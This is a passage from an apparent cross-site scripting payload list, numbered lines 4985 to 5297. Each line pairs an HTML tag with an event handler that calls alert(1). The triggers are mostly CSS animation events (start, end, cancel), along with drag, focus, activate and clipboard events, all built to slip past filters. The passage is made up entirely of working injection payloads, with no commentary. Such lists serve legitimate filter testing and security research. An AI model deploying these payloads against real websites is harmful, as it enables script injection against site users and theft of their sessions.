4985 | <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><textarea id=x style="position:absolute;" onanimationcancel="alert(1)"></textarea>
4986 | <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tfoot id=x style="position:absolute;" onanimationcancel="alert(1)"></tfoot>
4987 | <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><th id=x style="position:absolute;" onanimationcancel="alert(1)"></th>
4988 | <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><thead id=x style="position:absolute;" onanimationcancel="alert(1)"></thead>
4989 | <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><time id=x style="position:absolute;" onanimationcancel="alert(1)"></time>
4990 | <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><title id=x style="position:absolute;" onanimationcancel="alert(1)"></title>
4991 | <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tr id=x style="position:absolute;" onanimationcancel="alert(1)"></tr>
4992 | <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><track id=x style="position:absolute;" onanimationcancel="alert(1)"></track>
4993 | <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tt id=x style="position:absolute;" onanimationcancel="alert(1)"></tt>
4994 | <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><u id=x style="position:absolute;" onanimationcancel="alert(1)"></u>
4995 | <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ul id=x style="position:absolute;" onanimationcancel="alert(1)"></ul>
4996 | <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><var id=x style="position:absolute;" onanimationcancel="alert(1)"></var>
4997 | <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><video id=x style="position:absolute;" onanimationcancel="alert(1)"></video>
4998 | <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><wbr id=x style="position:absolute;" onanimationcancel="alert(1)"></wbr>
4999 | <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xmp id=x style="position:absolute;" onanimationcancel="alert(1)"></xmp>
5000 | <style>@keyframes x{}</style><a style="animation-name:x" onanimationend="alert(1)"></a>
5001 | <style>@keyframes x{}</style><a style="animation-name:x" onanimationstart="alert(1)"></a>
5002 | <style>@keyframes x{}</style><abbr style="animation-name:x" onanimationend="alert(1)"></abbr>
5003 | <style>@keyframes x{}</style><abbr style="animation-name:x" onanimationstart="alert(1)"></abbr>
5004 | <style>@keyframes x{}</style><acronym style="animation-name:x" onanimationend="alert(1)"></acronym>
5005 | <style>@keyframes x{}</style><acronym style="animation-name:x" onanimationstart="alert(1)"></acronym>
5006 | <style>@keyframes x{}</style><address style="animation-name:x" onanimationend="alert(1)"></address>
5007 | <style>@keyframes x{}</style><address style="animation-name:x" onanimationstart="alert(1)"></address>
5008 | <style>@keyframes x{}</style><applet style="animation-name:x" onanimationend="alert(1)"></applet>
5009 | <style>@keyframes x{}</style><applet style="animation-name:x" onanimationstart="alert(1)"></applet>
5010 | <style>@keyframes x{}</style><area style="animation-name:x" onanimationend="alert(1)"></area>
5011 | <style>@keyframes x{}</style><area style="animation-name:x" onanimationstart="alert(1)"></area>
5012 | <style>@keyframes x{}</style><article style="animation-name:x" onanimationend="alert(1)"></article>
5013 | <style>@keyframes x{}</style><article style="animation-name:x" onanimationstart="alert(1)"></article>
5014 | <style>@keyframes x{}</style><aside style="animation-name:x" onanimationend="alert(1)"></aside>
5015 | <style>@keyframes x{}</style><aside style="animation-name:x" onanimationstart="alert(1)"></aside>
5016 | <style>@keyframes x{}</style><audio style="animation-name:x" onanimationend="alert(1)"></audio>
5017 | <style>@keyframes x{}</style><audio style="animation-name:x" onanimationstart="alert(1)"></audio>
5018 | <style>@keyframes x{}</style><b style="animation-name:x" onanimationend="alert(1)"></b>
5019 | <style>@keyframes x{}</style><b style="animation-name:x" onanimationstart="alert(1)"></b>
5020 | <style>@keyframes x{}</style><base style="animation-name:x" onanimationend="alert(1)"></base>
5021 | <style>@keyframes x{}</style><base style="animation-name:x" onanimationstart="alert(1)"></base>
5022 | <style>@keyframes x{}</style><basefont style="animation-name:x" onanimationend="alert(1)"></basefont>
5023 | <style>@keyframes x{}</style><basefont style="animation-name:x" onanimationstart="alert(1)"></basefont>
5024 | <style>@keyframes x{}</style><bdi style="animation-name:x" onanimationend="alert(1)"></bdi>
5025 | <style>@keyframes x{}</style><bdi style="animation-name:x" onanimationstart="alert(1)"></bdi>
5026 | <style>@keyframes x{}</style><bdo style="animation-name:x" onanimationend="alert(1)"></bdo>
5027 | <style>@keyframes x{}</style><bdo style="animation-name:x" onanimationstart="alert(1)"></bdo>
5028 | <style>@keyframes x{}</style><bgsound style="animation-name:x" onanimationend="alert(1)"></bgsound>
5029 | <style>@keyframes x{}</style><bgsound style="animation-name:x" onanimationstart="alert(1)"></bgsound>
5030 | <style>@keyframes x{}</style><big style="animation-name:x" onanimationend="alert(1)"></big>
5031 | <style>@keyframes x{}</style><big style="animation-name:x" onanimationstart="alert(1)"></big>
5032 | <style>@keyframes x{}</style><blink style="animation-name:x" onanimationend="alert(1)"></blink>
5033 | <style>@keyframes x{}</style><blink style="animation-name:x" onanimationstart="alert(1)"></blink>
5034 | <style>@keyframes x{}</style><blockquote style="animation-name:x" onanimationend="alert(1)"></blockquote>
5035 | <style>@keyframes x{}</style><blockquote style="animation-name:x" onanimationstart="alert(1)"></blockquote>
5036 | <style>@keyframes x{}</style><body style="animation-name:x" onanimationend="alert(1)"></body>
5037 | <style>@keyframes x{}</style><body style="animation-name:x" onanimationstart="alert(1)"></body>
5038 | <style>@keyframes x{}</style><br style="animation-name:x" onanimationend="alert(1)"></br>
5039 | <style>@keyframes x{}</style><br style="animation-name:x" onanimationstart="alert(1)"></br>
5040 | <style>@keyframes x{}</style><button style="animation-name:x" onanimationend="alert(1)"></button>
5041 | <style>@keyframes x{}</style><button style="animation-name:x" onanimationstart="alert(1)"></button>
5042 | <style>@keyframes x{}</style><canvas style="animation-name:x" onanimationend="alert(1)"></canvas>
5043 | <style>@keyframes x{}</style><canvas style="animation-name:x" onanimationstart="alert(1)"></canvas>
5044 | <style>@keyframes x{}</style><caption style="animation-name:x" onanimationend="alert(1)"></caption>
5045 | <style>@keyframes x{}</style><caption style="animation-name:x" onanimationstart="alert(1)"></caption>
5046 | <style>@keyframes x{}</style><center style="animation-name:x" onanimationend="alert(1)"></center>
5047 | <style>@keyframes x{}</style><center style="animation-name:x" onanimationstart="alert(1)"></center>
5048 | <style>@keyframes x{}</style><cite style="animation-name:x" onanimationend="alert(1)"></cite>
5049 | <style>@keyframes x{}</style><cite style="animation-name:x" onanimationstart="alert(1)"></cite>
5050 | <style>@keyframes x{}</style><code style="animation-name:x" onanimationend="alert(1)"></code>
5051 | <style>@keyframes x{}</style><code style="animation-name:x" onanimationstart="alert(1)"></code>
5052 | <style>@keyframes x{}</style><col style="animation-name:x" onanimationend="alert(1)"></col>
5053 | <style>@keyframes x{}</style><col style="animation-name:x" onanimationstart="alert(1)"></col>
5054 | <style>@keyframes x{}</style><colgroup style="animation-name:x" onanimationend="alert(1)"></colgroup>
5055 | <style>@keyframes x{}</style><colgroup style="animation-name:x" onanimationstart="alert(1)"></colgroup>
5056 | <style>@keyframes x{}</style><command style="animation-name:x" onanimationend="alert(1)"></command>
5057 | <style>@keyframes x{}</style><command style="animation-name:x" onanimationstart="alert(1)"></command>
5058 | <style>@keyframes x{}</style><content style="animation-name:x" onanimationend="alert(1)"></content>
5059 | <style>@keyframes x{}</style><content style="animation-name:x" onanimationstart="alert(1)"></content>
5060 | <style>@keyframes x{}</style><data style="animation-name:x" onanimationend="alert(1)"></data>
5061 | <style>@keyframes x{}</style><data style="animation-name:x" onanimationstart="alert(1)"></data>
5062 | <style>@keyframes x{}</style><datalist style="animation-name:x" onanimationend="alert(1)"></datalist>
5063 | <style>@keyframes x{}</style><datalist style="animation-name:x" onanimationstart="alert(1)"></datalist>
5064 | <style>@keyframes x{}</style><dd style="animation-name:x" onanimationend="alert(1)"></dd>
5065 | <style>@keyframes x{}</style><dd style="animation-name:x" onanimationstart="alert(1)"></dd>
5066 | <style>@keyframes x{}</style><del style="animation-name:x" onanimationend="alert(1)"></del>
5067 | <style>@keyframes x{}</style><del style="animation-name:x" onanimationstart="alert(1)"></del>
5068 | <style>@keyframes x{}</style><details style="animation-name:x" onanimationend="alert(1)"></details>
5069 | <style>@keyframes x{}</style><details style="animation-name:x" onanimationstart="alert(1)"></details>
5070 | <style>@keyframes x{}</style><dfn style="animation-name:x" onanimationend="alert(1)"></dfn>
5071 | <style>@keyframes x{}</style><dfn style="animation-name:x" onanimationstart="alert(1)"></dfn>
5072 | <style>@keyframes x{}</style><dialog style="animation-name:x" onanimationend="alert(1)"></dialog>
5073 | <style>@keyframes x{}</style><dialog style="animation-name:x" onanimationstart="alert(1)"></dialog>
5074 | <style>@keyframes x{}</style><dir style="animation-name:x" onanimationend="alert(1)"></dir>
5075 | <style>@keyframes x{}</style><dir style="animation-name:x" onanimationstart="alert(1)"></dir>
5076 | <style>@keyframes x{}</style><div style="animation-name:x" onanimationend="alert(1)"></div>
5077 | <style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)"></div>
5078 | <style>@keyframes x{}</style><dl style="animation-name:x" onanimationend="alert(1)"></dl>
5079 | <style>@keyframes x{}</style><dl style="animation-name:x" onanimationstart="alert(1)"></dl>
5080 | <style>@keyframes x{}</style><dt style="animation-name:x" onanimationend="alert(1)"></dt>
5081 | <style>@keyframes x{}</style><dt style="animation-name:x" onanimationstart="alert(1)"></dt>
5082 | <style>@keyframes x{}</style><element style="animation-name:x" onanimationend="alert(1)"></element>
5083 | <style>@keyframes x{}</style><element style="animation-name:x" onanimationstart="alert(1)"></element>
5084 | <style>@keyframes x{}</style><em style="animation-name:x" onanimationend="alert(1)"></em>
5085 | <style>@keyframes x{}</style><em style="animation-name:x" onanimationstart="alert(1)"></em>
5086 | <style>@keyframes x{}</style><embed style="animation-name:x" onanimationend="alert(1)"></embed>
5087 | <style>@keyframes x{}</style><embed style="animation-name:x" onanimationstart="alert(1)"></embed>
5088 | <style>@keyframes x{}</style><fieldset style="animation-name:x" onanimationend="alert(1)"></fieldset>
5089 | <style>@keyframes x{}</style><fieldset style="animation-name:x" onanimationstart="alert(1)"></fieldset>
5090 | <style>@keyframes x{}</style><figcaption style="animation-name:x" onanimationend="alert(1)"></figcaption>
5091 | <style>@keyframes x{}</style><figcaption style="animation-name:x" onanimationstart="alert(1)"></figcaption>
5092 | <style>@keyframes x{}</style><figure style="animation-name:x" onanimationend="alert(1)"></figure>
5093 | <style>@keyframes x{}</style><figure style="animation-name:x" onanimationstart="alert(1)"></figure>
5094 | <style>@keyframes x{}</style><font style="animation-name:x" onanimationend="alert(1)"></font>
5095 | <style>@keyframes x{}</style><font style="animation-name:x" onanimationstart="alert(1)"></font>
5096 | <style>@keyframes x{}</style><footer style="animation-name:x" onanimationend="alert(1)"></footer>
5097 | <style>@keyframes x{}</style><footer style="animation-name:x" onanimationstart="alert(1)"></footer>
5098 | <style>@keyframes x{}</style><form style="animation-name:x" onanimationend="alert(1)"></form>
5099 | <style>@keyframes x{}</style><form style="animation-name:x" onanimationstart="alert(1)"></form>
5100 | <style>@keyframes x{}</style><frame style="animation-name:x" onanimationend="alert(1)"></frame>
5101 | <style>@keyframes x{}</style><frame style="animation-name:x" onanimationstart="alert(1)"></frame>
5102 | <style>@keyframes x{}</style><frameset style="animation-name:x" onanimationend="alert(1)"></frameset>
5103 | <style>@keyframes x{}</style><frameset style="animation-name:x" onanimationstart="alert(1)"></frameset>
5104 | <style>@keyframes x{}</style><h1 style="animation-name:x" onanimationend="alert(1)"></h1>
5105 | <style>@keyframes x{}</style><h1 style="animation-name:x" onanimationstart="alert(1)"></h1>
5106 | <style>@keyframes x{}</style><head style="animation-name:x" onanimationend="alert(1)"></head>
5107 | <style>@keyframes x{}</style><head style="animation-name:x" onanimationstart="alert(1)"></head>
5108 | <style>@keyframes x{}</style><header style="animation-name:x" onanimationend="alert(1)"></header>
5109 | <style>@keyframes x{}</style><header style="animation-name:x" onanimationstart="alert(1)"></header>
5110 | <style>@keyframes x{}</style><hgroup style="animation-name:x" onanimationend="alert(1)"></hgroup>
5111 | <style>@keyframes x{}</style><hgroup style="animation-name:x" onanimationstart="alert(1)"></hgroup>
5112 | <style>@keyframes x{}</style><hr style="animation-name:x" onanimationend="alert(1)"></hr>
5113 | <style>@keyframes x{}</style><hr style="animation-name:x" onanimationstart="alert(1)"></hr>
5114 | <style>@keyframes x{}</style><html style="animation-name:x" onanimationend="alert(1)"></html>
5115 | <style>@keyframes x{}</style><html style="animation-name:x" onanimationstart="alert(1)"></html>
5116 | <style>@keyframes x{}</style><i style="animation-name:x" onanimationend="alert(1)"></i>
5117 | <style>@keyframes x{}</style><i style="animation-name:x" onanimationstart="alert(1)"></i>
5118 | <style>@keyframes x{}</style><iframe style="animation-name:x" onanimationend="alert(1)"></iframe>
5119 | <style>@keyframes x{}</style><iframe style="animation-name:x" onanimationstart="alert(1)"></iframe>
5120 | <style>@keyframes x{}</style><image style="animation-name:x" onanimationend="alert(1)"></image>
5121 | <style>@keyframes x{}</style><image style="animation-name:x" onanimationstart="alert(1)"></image>
5122 | <style>@keyframes x{}</style><img style="animation-name:x" onanimationend="alert(1)"></img>
5123 | <style>@keyframes x{}</style><img style="animation-name:x" onanimationstart="alert(1)"></img>
5124 | <style>@keyframes x{}</style><input style="animation-name:x" onanimationend="alert(1)"></input>
5125 | <style>@keyframes x{}</style><input style="animation-name:x" onanimationstart="alert(1)"></input>
5126 | <style>@keyframes x{}</style><ins style="animation-name:x" onanimationend="alert(1)"></ins>
5127 | <style>@keyframes x{}</style><ins style="animation-name:x" onanimationstart="alert(1)"></ins>
5128 | <style>@keyframes x{}</style><isindex style="animation-name:x" onanimationend="alert(1)"></isindex>
5129 | <style>@keyframes x{}</style><isindex style="animation-name:x" onanimationstart="alert(1)"></isindex>
5130 | <style>@keyframes x{}</style><kbd style="animation-name:x" onanimationend="alert(1)"></kbd>
5131 | <style>@keyframes x{}</style><kbd style="animation-name:x" onanimationstart="alert(1)"></kbd>
5132 | <style>@keyframes x{}</style><keygen style="animation-name:x" onanimationend="alert(1)"></keygen>
5133 | <style>@keyframes x{}</style><keygen style="animation-name:x" onanimationstart="alert(1)"></keygen>
5134 | <style>@keyframes x{}</style><label style="animation-name:x" onanimationend="alert(1)"></label>
5135 | <style>@keyframes x{}</style><label style="animation-name:x" onanimationstart="alert(1)"></label>
5136 | <style>@keyframes x{}</style><legend style="animation-name:x" onanimationend="alert(1)"></legend>
5137 | <style>@keyframes x{}</style><legend style="animation-name:x" onanimationstart="alert(1)"></legend>
5138 | <style>@keyframes x{}</style><li style="animation-name:x" onanimationend="alert(1)"></li>
5139 | <style>@keyframes x{}</style><li style="animation-name:x" onanimationstart="alert(1)"></li>
5140 | <style>@keyframes x{}</style><link style="animation-name:x" onanimationend="alert(1)"></link>
5141 | <style>@keyframes x{}</style><link style="animation-name:x" onanimationstart="alert(1)"></link>
5142 | <style>@keyframes x{}</style><listing style="animation-name:x" onanimationend="alert(1)"></listing>
5143 | <style>@keyframes x{}</style><listing style="animation-name:x" onanimationstart="alert(1)"></listing>
5144 | <style>@keyframes x{}</style><main style="animation-name:x" onanimationend="alert(1)"></main>
5145 | <style>@keyframes x{}</style><main style="animation-name:x" onanimationstart="alert(1)"></main>
5146 | <style>@keyframes x{}</style><map style="animation-name:x" onanimationend="alert(1)"></map>
5147 | <style>@keyframes x{}</style><map style="animation-name:x" onanimationstart="alert(1)"></map>
5148 | <style>@keyframes x{}</style><mark style="animation-name:x" onanimationend="alert(1)"></mark>
5149 | <style>@keyframes x{}</style><mark style="animation-name:x" onanimationstart="alert(1)"></mark>
5150 | <style>@keyframes x{}</style><marquee style="animation-name:x" onanimationend="alert(1)"></marquee>
5151 | <style>@keyframes x{}</style><marquee style="animation-name:x" onanimationstart="alert(1)"></marquee>
5152 | <style>@keyframes x{}</style><menu style="animation-name:x" onanimationend="alert(1)"></menu>
5153 | <style>@keyframes x{}</style><menu style="animation-name:x" onanimationstart="alert(1)"></menu>
5154 | <style>@keyframes x{}</style><menuitem style="animation-name:x" onanimationend="alert(1)"></menuitem>
5155 | <style>@keyframes x{}</style><menuitem style="animation-name:x" onanimationstart="alert(1)"></menuitem>
5156 | <style>@keyframes x{}</style><meta style="animation-name:x" onanimationend="alert(1)"></meta>
5157 | <style>@keyframes x{}</style><meta style="animation-name:x" onanimationstart="alert(1)"></meta>
5158 | <style>@keyframes x{}</style><meter style="animation-name:x" onanimationend="alert(1)"></meter>
5159 | <style>@keyframes x{}</style><meter style="animation-name:x" onanimationstart="alert(1)"></meter>
5160 | <style>@keyframes x{}</style><multicol style="animation-name:x" onanimationend="alert(1)"></multicol>
5161 | <style>@keyframes x{}</style><multicol style="animation-name:x" onanimationstart="alert(1)"></multicol>
5162 | <style>@keyframes x{}</style><nav style="animation-name:x" onanimationend="alert(1)"></nav>
5163 | <style>@keyframes x{}</style><nav style="animation-name:x" onanimationstart="alert(1)"></nav>
5164 | <style>@keyframes x{}</style><nextid style="animation-name:x" onanimationend="alert(1)"></nextid>
5165 | <style>@keyframes x{}</style><nextid style="animation-name:x" onanimationstart="alert(1)"></nextid>
5166 | <style>@keyframes x{}</style><nobr style="animation-name:x" onanimationend="alert(1)"></nobr>
5167 | <style>@keyframes x{}</style><nobr style="animation-name:x" onanimationstart="alert(1)"></nobr>
5168 | <style>@keyframes x{}</style><noembed style="animation-name:x" onanimationend="alert(1)"></noembed>
5169 | <style>@keyframes x{}</style><noembed style="animation-name:x" onanimationstart="alert(1)"></noembed>
5170 | <style>@keyframes x{}</style><noframes style="animation-name:x" onanimationend="alert(1)"></noframes>
5171 | <style>@keyframes x{}</style><noframes style="animation-name:x" onanimationstart="alert(1)"></noframes>
5172 | <style>@keyframes x{}</style><noscript style="animation-name:x" onanimationend="alert(1)"></noscript>
5173 | <style>@keyframes x{}</style><noscript style="animation-name:x" onanimationstart="alert(1)"></noscript>
5174 | <style>@keyframes x{}</style><object style="animation-name:x" onanimationend="alert(1)"></object>
5175 | <style>@keyframes x{}</style><object style="animation-name:x" onanimationstart="alert(1)"></object>
5176 | <style>@keyframes x{}</style><ol style="animation-name:x" onanimationend="alert(1)"></ol>
5177 | <style>@keyframes x{}</style><ol style="animation-name:x" onanimationstart="alert(1)"></ol>
5178 | <style>@keyframes x{}</style><optgroup style="animation-name:x" onanimationend="alert(1)"></optgroup>
5179 | <style>@keyframes x{}</style><optgroup style="animation-name:x" onanimationstart="alert(1)"></optgroup>
5180 | <style>@keyframes x{}</style><option style="animation-name:x" onanimationend="alert(1)"></option>
5181 | <style>@keyframes x{}</style><option style="animation-name:x" onanimationstart="alert(1)"></option>
5182 | <style>@keyframes x{}</style><output style="animation-name:x" onanimationend="alert(1)"></output>
5183 | <style>@keyframes x{}</style><output style="animation-name:x" onanimationstart="alert(1)"></output>
5184 | <style>@keyframes x{}</style><p style="animation-name:x" onanimationend="alert(1)"></p>
5185 | <style>@keyframes x{}</style><p style="animation-name:x" onanimationstart="alert(1)"></p>
5186 | <style>@keyframes x{}</style><param style="animation-name:x" onanimationend="alert(1)"></param>
5187 | <style>@keyframes x{}</style><param style="animation-name:x" onanimationstart="alert(1)"></param>
5188 | <style>@keyframes x{}</style><picture style="animation-name:x" onanimationend="alert(1)"></picture>
5189 | <style>@keyframes x{}</style><picture style="animation-name:x" onanimationstart="alert(1)"></picture>
5190 | <style>@keyframes x{}</style><plaintext style="animation-name:x" onanimationend="alert(1)"></plaintext>
5191 | <style>@keyframes x{}</style><plaintext style="animation-name:x" onanimationstart="alert(1)"></plaintext>
5192 | <style>@keyframes x{}</style><pre style="animation-name:x" onanimationend="alert(1)"></pre>
5193 | <style>@keyframes x{}</style><pre style="animation-name:x" onanimationstart="alert(1)"></pre>
5194 | <style>@keyframes x{}</style><progress style="animation-name:x" onanimationend="alert(1)"></progress>
5195 | <style>@keyframes x{}</style><progress style="animation-name:x" onanimationstart="alert(1)"></progress>
5196 | <style>@keyframes x{}</style><q style="animation-name:x" onanimationend="alert(1)"></q>
5197 | <style>@keyframes x{}</style><q style="animation-name:x" onanimationstart="alert(1)"></q>
5198 | <style>@keyframes x{}</style><rb style="animation-name:x" onanimationend="alert(1)"></rb>
5199 | <style>@keyframes x{}</style><rb style="animation-name:x" onanimationstart="alert(1)"></rb>
5200 | <style>@keyframes x{}</style><rp style="animation-name:x" onanimationend="alert(1)"></rp>
5201 | <style>@keyframes x{}</style><rp style="animation-name:x" onanimationstart="alert(1)"></rp>
5202 | <style>@keyframes x{}</style><rt style="animation-name:x" onanimationend="alert(1)"></rt>
5203 | <style>@keyframes x{}</style><rt style="animation-name:x" onanimationstart="alert(1)"></rt>
5204 | <style>@keyframes x{}</style><rtc style="animation-name:x" onanimationend="alert(1)"></rtc>
5205 | <style>@keyframes x{}</style><rtc style="animation-name:x" onanimationstart="alert(1)"></rtc>
5206 | <style>@keyframes x{}</style><ruby style="animation-name:x" onanimationend="alert(1)"></ruby>
5207 | <style>@keyframes x{}</style><ruby style="animation-name:x" onanimationstart="alert(1)"></ruby>
5208 | <style>@keyframes x{}</style><s style="animation-name:x" onanimationend="alert(1)"></s>
5209 | <style>@keyframes x{}</style><s style="animation-name:x" onanimationstart="alert(1)"></s>
5210 | <style>@keyframes x{}</style><samp style="animation-name:x" onanimationend="alert(1)"></samp>
5211 | <style>@keyframes x{}</style><samp style="animation-name:x" onanimationstart="alert(1)"></samp>
5212 | <style>@keyframes x{}</style><script style="animation-name:x" onanimationend="alert(1)"></script>
5213 | <style>@keyframes x{}</style><script style="animation-name:x" onanimationstart="alert(1)"></script>
5214 | <style>@keyframes x{}</style><section style="animation-name:x" onanimationend="alert(1)"></section>
5215 | <style>@keyframes x{}</style><section style="animation-name:x" onanimationstart="alert(1)"></section>
5216 | <style>@keyframes x{}</style><select style="animation-name:x" onanimationend="alert(1)"></select>
5217 | <style>@keyframes x{}</style><select style="animation-name:x" onanimationstart="alert(1)"></select>
5218 | <style>@keyframes x{}</style><shadow style="animation-name:x" onanimationend="alert(1)"></shadow>
5219 | <style>@keyframes x{}</style><shadow style="animation-name:x" onanimationstart="alert(1)"></shadow>
5220 | <style>@keyframes x{}</style><slot style="animation-name:x" onanimationend="alert(1)"></slot>
5221 | <style>@keyframes x{}</style><slot style="animation-name:x" onanimationstart="alert(1)"></slot>
5222 | <style>@keyframes x{}</style><small style="animation-name:x" onanimationend="alert(1)"></small>
5223 | <style>@keyframes x{}</style><small style="animation-name:x" onanimationstart="alert(1)"></small>
5224 | <style>@keyframes x{}</style><source style="animation-name:x" onanimationend="alert(1)"></source>
5225 | <style>@keyframes x{}</style><source style="animation-name:x" onanimationstart="alert(1)"></source>
5226 | <style>@keyframes x{}</style><spacer style="animation-name:x" onanimationend="alert(1)"></spacer>
5227 | <style>@keyframes x{}</style><spacer style="animation-name:x" onanimationstart="alert(1)"></spacer>
5228 | <style>@keyframes x{}</style><span style="animation-name:x" onanimationend="alert(1)"></span>
5229 | <style>@keyframes x{}</style><span style="animation-name:x" onanimationstart="alert(1)"></span>
5230 | <style>@keyframes x{}</style><strike style="animation-name:x" onanimationend="alert(1)"></strike>
5231 | <style>@keyframes x{}</style><strike style="animation-name:x" onanimationstart="alert(1)"></strike>
5232 | <style>@keyframes x{}</style><strong style="animation-name:x" onanimationend="alert(1)"></strong>
5233 | <style>@keyframes x{}</style><strong style="animation-name:x" onanimationstart="alert(1)"></strong>
5234 | <style>@keyframes x{}</style><style style="animation-name:x" onanimationend="alert(1)"></style>
5235 | <style>@keyframes x{}</style><style style="animation-name:x" onanimationstart="alert(1)"></style>
5236 | <style>@keyframes x{}</style><sub style="animation-name:x" onanimationend="alert(1)"></sub>
5237 | <style>@keyframes x{}</style><sub style="animation-name:x" onanimationstart="alert(1)"></sub>
5238 | <style>@keyframes x{}</style><summary style="animation-name:x" onanimationend="alert(1)"></summary>
5239 | <style>@keyframes x{}</style><summary style="animation-name:x" onanimationstart="alert(1)"></summary>
5240 | <style>@keyframes x{}</style><sup style="animation-name:x" onanimationend="alert(1)"></sup>
5241 | <style>@keyframes x{}</style><sup style="animation-name:x" onanimationstart="alert(1)"></sup>
5242 | <style>@keyframes x{}</style><svg style="animation-name:x" onanimationend="alert(1)"></svg>
5243 | <style>@keyframes x{}</style><svg style="animation-name:x" onanimationstart="alert(1)"></svg>
5244 | <style>@keyframes x{}</style><table style="animation-name:x" onanimationend="alert(1)"></table>
5245 | <style>@keyframes x{}</style><table style="animation-name:x" onanimationstart="alert(1)"></table>
5246 | <style>@keyframes x{}</style><tbody style="animation-name:x" onanimationend="alert(1)"></tbody>
5247 | <style>@keyframes x{}</style><tbody style="animation-name:x" onanimationstart="alert(1)"></tbody>
5248 | <style>@keyframes x{}</style><td style="animation-name:x" onanimationend="alert(1)"></td>
5249 | <style>@keyframes x{}</style><td style="animation-name:x" onanimationstart="alert(1)"></td>
5250 | <style>@keyframes x{}</style><template style="animation-name:x" onanimationend="alert(1)"></template>
5251 | <style>@keyframes x{}</style><template style="animation-name:x" onanimationstart="alert(1)"></template>
5252 | <style>@keyframes x{}</style><textarea style="animation-name:x" onanimationend="alert(1)"></textarea>
5253 | <style>@keyframes x{}</style><textarea style="animation-name:x" onanimationstart="alert(1)"></textarea>
5254 | <style>@keyframes x{}</style><tfoot style="animation-name:x" onanimationend="alert(1)"></tfoot>
5255 | <style>@keyframes x{}</style><tfoot style="animation-name:x" onanimationstart="alert(1)"></tfoot>
5256 | <style>@keyframes x{}</style><th style="animation-name:x" onanimationend="alert(1)"></th>
5257 | <style>@keyframes x{}</style><th style="animation-name:x" onanimationstart="alert(1)"></th>
5258 | <style>@keyframes x{}</style><thead style="animation-name:x" onanimationend="alert(1)"></thead>
5259 | <style>@keyframes x{}</style><thead style="animation-name:x" onanimationstart="alert(1)"></thead>
5260 | <style>@keyframes x{}</style><time style="animation-name:x" onanimationend="alert(1)"></time>
5261 | <style>@keyframes x{}</style><time style="animation-name:x" onanimationstart="alert(1)"></time>
5262 | <style>@keyframes x{}</style><title style="animation-name:x" onanimationend="alert(1)"></title>
5263 | <style>@keyframes x{}</style><title style="animation-name:x" onanimationstart="alert(1)"></title>
5264 | <style>@keyframes x{}</style><tr style="animation-name:x" onanimationend="alert(1)"></tr>
5265 | <style>@keyframes x{}</style><tr style="animation-name:x" onanimationstart="alert(1)"></tr>
5266 | <style>@keyframes x{}</style><track style="animation-name:x" onanimationend="alert(1)"></track>
5267 | <style>@keyframes x{}</style><track style="animation-name:x" onanimationstart="alert(1)"></track>
5268 | <style>@keyframes x{}</style><tt style="animation-name:x" onanimationend="alert(1)"></tt>
5269 | <style>@keyframes x{}</style><tt style="animation-name:x" onanimationstart="alert(1)"></tt>
5270 | <style>@keyframes x{}</style><u style="animation-name:x" onanimationend="alert(1)"></u>
5271 | <style>@keyframes x{}</style><u style="animation-name:x" onanimationstart="alert(1)"></u>
5272 | <style>@keyframes x{}</style><ul style="animation-name:x" onanimationend="alert(1)"></ul>
5273 | <style>@keyframes x{}</style><ul style="animation-name:x" onanimationstart="alert(1)"></ul>
5274 | <style>@keyframes x{}</style><var style="animation-name:x" onanimationend="alert(1)"></var>
5275 | <style>@keyframes x{}</style><var style="animation-name:x" onanimationstart="alert(1)"></var>
5276 | <style>@keyframes x{}</style><video style="animation-name:x" onanimationend="alert(1)"></video>
5277 | <style>@keyframes x{}</style><video style="animation-name:x" onanimationstart="alert(1)"></video>
5278 | <style>@keyframes x{}</style><wbr style="animation-name:x" onanimationend="alert(1)"></wbr>
5279 | <style>@keyframes x{}</style><wbr style="animation-name:x" onanimationstart="alert(1)"></wbr>
5280 | <style>@keyframes x{}</style><xmp style="animation-name:x" onanimationend="alert(1)"></xmp>
5281 | <style>@keyframes x{}</style><xmp style="animation-name:x" onanimationstart="alert(1)"></xmp>
5282 | <style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
5283 | <style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>
5284 | <sub draggable="true" ondrag="alert(1)">test</sub>
5285 | <sub draggable="true" ondragend="alert(1)">test</sub>
5286 | <sub draggable="true" ondragenter="alert(1)">test</sub>
5287 | <sub draggable="true" ondragleave="alert(1)">test</sub>
5288 | <sub draggable="true" ondragstart="alert(1)">test</sub>
5289 | <sub id=x tabindex=1 onactivate=alert(1)></sub>
5290 | <sub id=x tabindex=1 onbeforeactivate=alert(1)></sub>
5291 | <sub id=x tabindex=1 onbeforedeactivate=alert(1)></sub><input autofocus>
5292 | <sub id=x tabindex=1 ondeactivate=alert(1)></sub><input id=y autofocus>
5293 | <sub id=x tabindex=1 onfocus=alert(1)></sub>
5294 | <sub id=x tabindex=1 onfocusin=alert(1)></sub>
5295 | <sub onbeforecopy="alert(1)" contenteditable>test</sub>
5296 | <sub onbeforecut="alert(1)" contenteditable>test</sub>
5297 | <sub onbeforepaste="alert(1)" contenteditable>test</sub>
